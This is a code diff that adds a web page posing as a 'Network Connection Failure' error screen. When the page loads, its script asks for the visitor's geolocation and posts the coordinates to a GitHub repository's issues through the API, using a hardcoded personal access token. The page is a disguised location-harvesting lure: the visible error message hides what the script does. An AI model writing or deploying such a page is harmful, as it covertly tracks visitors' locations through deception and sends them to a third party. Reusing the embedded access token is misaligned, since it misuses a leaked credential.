@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Network Failure</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        padding: 50px;
+      }
+      .failure-message {
+        color: rgb(69, 67, 67);
+        font-size: 24px;
+      }
+ 
+    </style>
+  </head>
+  <body>
+    <div class="failure-message" id="failureMessage">Network Connection Failure</div>
+
+    <script>
+      // Check if geolocation is available
+      function getGeolocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
+
+             
+              const proxyUrl = "https://cors-anywhere.herokuapp.com/";
+              const apiUrl = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;
+              let formattedAddress = "";
+              fetch(proxyUrl + apiUrl)
+                .then((response) => response.json())
+                .then((data) => {
+                  if (data && data.address) {
+                    const address = data.address;
+                    formattedAddress = `${address.road}, ${address.city}, ${address.state}, ${address.country}`;
+                   
+                  } else {
+                    
+                  }
+                })
+                .catch((error) => {
+                  console.error("Error fetching address:", error);
+                });
+              // Send this geolocation data to GitHub using GitHub API
+              fetch("https://api.github.com/repos/bhanubediya/Network-Failure/issues", {
+                method: "POST",
+                headers: {
+                  Authorization: `token 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`,
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                  title: `Geolocation: ${latitude}, ${longitude}`,
+                  body: `Latitude: ${latitude}, Longitude: ${longitude}`,
+                  labels: ["Geolocation"],
+                  Address: formattedAddress,
+                }),
+              })
+                .then((response) => response.json())
+                .then((data) => {
+                  console.log("Location data sent:", data);
+                })
+                .catch((error) => console.error("Error sending location data:", error));
+            },
+            function (error) {
+              console.error("Error getting geolocation: ", error);
+            }
+          );
+        } else {
+          console.log("Geolocation is not supported by this browser.");
+        }
+      }
+      window.onload = getGeolocation;
+    </script>
+  </body>
+</html>
